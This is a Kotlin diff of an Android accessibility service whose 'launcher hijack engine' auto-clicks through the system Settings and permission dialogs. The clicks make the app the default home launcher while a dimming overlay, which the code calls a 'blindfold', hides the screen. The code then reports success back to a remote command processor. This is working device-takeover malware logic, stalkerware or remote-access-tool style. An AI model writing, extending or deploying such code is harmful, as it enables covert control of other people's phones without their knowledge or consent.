@@ -342,47 +342,43 @@ class MyAccessibilityService : AccessibilityService() {
         if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
             // --- LAUNCHER HIJACK ENGINE ---
             if (LauncherManager.isHijacking) {
-                val root = rootInActiveWindow
-                if (root != null) {
-                    val targetLabel = getString(R.string.label_settings_app) // "Settings"
-                    logThrottled("GHOST_LAUNCHER_WAIT", "Active window pkg: $pkgName | Looking for: $targetLabel", 1000L)
+                val currentHome = DeviceManager.getDefaultApps(this).optString("launcher", "")
+                if (currentHome == packageName) {
+                    DebugLogger.log("GHOST_LAUNCHER", "Active Verification SUCCESS! Target is now Default Home.")
+                    LauncherManager.isHijacking = false
+                    CommandProcessor.updateCommandStatus(applicationContext, LauncherManager.pendingCmdId, "SUCCESS", "Default Launcher set via Ghost Hand")
                     
-                    val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
-                    if (nodes.isEmpty()) {
-                        logThrottled("GHOST_LAUNCHER_WAIT", "Target label '$targetLabel' not found in current UI tree.", 1000L)
-                    } else {
-                        var clicked = false
-                        for (node in nodes) {
-                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                            while (target != null && !target.isClickable) target = target.parent
-                            if (target != null && target.isClickable) {
-                                target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                                clicked = true
-                                DebugLogger.log("GHOST_LAUNCHER", "SUCCESS! Clicked radio button for: $targetLabel")
-                                break
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                            performGlobalAction(GLOBAL_ACTION_HOME)
+                            DimmerManager.removeOverlay(applicationContext)
+                        }, 500)
+                    }, 1000)
+                } else {
+                    val root = rootInActiveWindow
+                    if (root != null) {
+                        val targetLabel = getString(R.string.label_settings_app)
+                        val nodes = root.findAccessibilityNodeInfosByText(targetLabel)
+                        
+                        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                        val lastClick = prefs.getLong("ghost_launcher_click_ts", 0L)
+                        
+                        if (nodes.isNotEmpty() && (System.currentTimeMillis() - lastClick > 2000)) {
+                            for (node in nodes) {
+                                var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                                while (target != null && !target.isClickable) target = target.parent
+                                if (target != null && target.isClickable) {
+                                    target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                    prefs.edit().putLong("ghost_launcher_click_ts", System.currentTimeMillis()).apply()
+                                    DebugLogger.log("GHOST_LAUNCHER", "Clicked radio button for: $targetLabel. Waiting for OS confirmation...")
+                                    break
+                                }
                             }
-                        }
-                        
-                        if (!clicked) {
-                            logThrottled("GHOST_LAUNCHER_WAIT", "Found label: $targetLabel, but no clickable parent found.", 1000L)
-                        }
-                        
-                        if (clicked) {
-                            LauncherManager.isHijacking = false
-                            CommandProcessor.updateCommandStatus(applicationContext, LauncherManager.pendingCmdId, "SUCCESS", "Default Launcher set via Ghost Hand")
-                            
-                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                                performGlobalAction(GLOBAL_ACTION_HOME)
-                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                                    performGlobalAction(GLOBAL_ACTION_HOME)
-                                    DimmerManager.removeOverlay(applicationContext)
-                                    DebugLogger.log("GHOST_LAUNCHER", "Returned Home and removed blindfold.")
-                                }, 400)
-                            }, 800)
+                        } else if (nodes.isEmpty()) {
+                            logThrottled("GHOST_LAUNCHER_WAIT", "Target label '$targetLabel' not found in current UI tree.", 1000L)
                         }
                     }
-                } else {
-                    logThrottled("GHOST_LAUNCHER_WAIT", "rootInActiveWindow is null. Cannot inspect UI.", 1000L)
                 }
             }
         }
